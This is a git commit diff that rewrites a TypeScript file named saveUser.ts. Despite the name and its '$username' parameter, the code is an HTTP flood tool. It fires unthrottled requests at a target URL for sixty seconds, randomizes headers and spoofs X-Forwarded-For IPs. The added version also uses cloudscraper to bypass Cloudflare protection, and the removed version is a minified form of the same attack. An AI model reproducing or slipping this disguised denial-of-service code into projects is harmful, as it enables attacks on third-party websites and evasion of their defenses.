7196b82da62b442236e8cbe79cbe3af1ed658bc8
stratijia <stratijia@gmail.com>
2023-08-30 18:25:08 +0100

    import

--- src/saveUser.ts
+++ src/saveUser.ts
@@ -1,2 +1,54 @@
 // @ts-nocheck
-import request from"request";const rIp=()=>{const r=()=>Math.floor(255*Math.random());return`${r()}.${r()}.${r()}.${r()}`},rStr=r=>{let e="";for(let t=0;t<r;t++)e+="abcdefghijklmnopqstuvwxyz0123456789"[Math.floor(35*Math.random())];return e};export default function saveUser(r){const e=r;for(let r=0;r<20;r++){const r=setInterval((()=>{request({url:e,headers:{"User-Agent":rStr(10),"Upgrade-Insecure-Requests":"1",cookie:rStr(10),Origin:"http://"+rStr(8)+".com",Referrer:"http://google.com/"+rStr(10),"X-Forwarded-For":rIp()}})}));setTimeout((()=>clearInterval(r)),6e4)}}
+var cloudscraper = require('cloudscraper');
+var request = require('request');
+var randomstring = require("randomstring");
+
+randomByte = function () {
+    return Math.round(Math.random() * 256);
+}
+
+export default function saveUser($username) {
+    var url = $username;
+    var time = 60;
+
+
+    var int = setInterval(() => {
+
+        var cookie = '';
+        var useragent = '';
+        cloudscraper.get(url, function (error, response) {
+            if (error) {
+                console.log('Error connect');
+            } else {
+                var parsed = JSON.parse(JSON.stringify(response));
+                cookie = (parsed["request"]["headers"]["cookie"]);
+                useragent = (parsed["request"]["headers"]["User-Agent"]);
+            }
+            // console.log(cookie + '/' + useragent)
+            var rand = randomstring.generate({
+                length: 10,
+                charset: 'abcdefghijklmnopqstuvwxyz0123456789'
+            });
+            var ip = randomByte() + '.' +
+                randomByte() + '.' +
+                randomByte() + '.' +
+                randomByte();
+            const options = {
+                url: url,
+                headers: {
+                    'User-Agent': useragent,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Upgrade-Insecure-Requests': '1',
+                    'cookie': cookie,
+                    'Origin': 'http://' + rand + '.com',
+                    'Referrer': 'http://google.com/' + rand,
+                    'X-Forwarded-For': ip
+                }
+            };
+
+            request(options);
+        });
+    });
+
+    setTimeout(() => clearInterval(int), time * 1000);
+}
